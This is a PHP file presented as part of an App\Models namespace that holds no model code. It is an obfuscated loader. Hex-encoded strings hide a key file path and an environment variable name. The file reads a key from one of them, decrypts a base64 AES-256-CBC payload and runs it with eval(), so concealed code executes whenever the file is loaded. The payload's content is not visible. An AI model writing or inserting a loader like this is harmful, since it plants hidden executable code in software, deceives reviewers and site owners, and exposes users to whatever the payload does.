<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4sRgZMs5NfYCKi228sisTQ==');

$c=base64_decode(

'UaWTTgyLisuhbq2oURZvMFSR99nB+I1kOg5ZR1KgD3+WXC7z8NPx6/jzO2gn+UmoHc8vrMWBaRQj' .
'iNLygPTdwZ3tRslJTjslzpTZlVL3nD9lmEKXvQAEOjMbOpwsnR3Pnblt8Bu7XdCnAqByIUGCu5Ni' .
'YnA7TZ2n8eKhxDO3OCIiVHS/P2OGR8hphwfaBiXh4aNex5uswkm1h0FCrJ88TmsBfZpAvdd1Gnxn' .
'yw5UGQKcLBvHRPaTZXmjB+vwiaGLyfyTUmA2EhFaDKiGRsd7+td3epX62LoZGnSV8Zap//DnSq5b' .
'yE2GVtMsOfzawAhA2dnptQhI/BaRh8fWQSRn5ndFtxUeiFQzK1WchclIUBqIY2LfXhq1+IjeH7OT' .
'xx2XASFziEBSKy7ZTnlmLu1fQ1pXVaHPXzaTKFsWAFIuekjSN+8zCpAKCEBYbIoBL6OcQQ1LWS/c' .
'+8NP794xlQxa9+B7n4Y7qAQrxSb4KrbDSim7ZXn+BhlGPWJPTO7wQCSiO+g/qv6ECl6GIXtOIj3Z' .
'RPYsgB3YvqjvZs3o9jyxbwOYFlkd67q/QeLsop+ITUgpajJYfiAvNzJ499hBwY3yKzOCO5e7t+FJ' .
'5nDJoUNJW5EhAVsd8cPJenBSYOJVLmYdgv07lkZUz41lU6eO46o7gPsKc69YfyUw8QMmhFCMCdye' .
't8bcxOUiGvo27og4otDj7hudP9gyaNecOHdL3iMq24LLxmZnZSw0Z9y9+dUgXJ7v0K+24BbGv3uQ' .
'kUivKJDlNhfeKPdX2sSTqUcGjnjVk3dHnsW0m5FeT9ge0vRUzKdp2rTbOrOa028+ER0R8tLqpeOX' .
'pjkTGgvcQgxbE2Qry3Ga2IdVdo4NbcD/3SLW/xkuMs6073KBSrPj8Rgdg6yuCj7UgKTKqgFjHYuA' .
'3EGATMBSeL1TRd51XYmbQpm3fT3nTVfwJDYmId2KEPfgkgeBDIMaGHpFn+L3Wh43ObEgHrO8KYRQ' .
'd82hFSjUnluHJrxo4WU+uHCa46NbIOTTCjYxpHfMrJC2KZGIOY51HxxLO75ySm1p+0cloxjkAvFp' .
'1ojmfuWSJR6EhJfjQwTv+xgAggaUSRdrDH9eUC02zx0KG7au1uimUVVNO5bAazLHa1HsAKWGmZeA' .
'UFasLt7fzJTJPS+qcET+YsJIxN3e0iEkwH1Qxpt/doKDhJ161iiLAk8mKoDaPfQ1Ws6CucJse/FG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

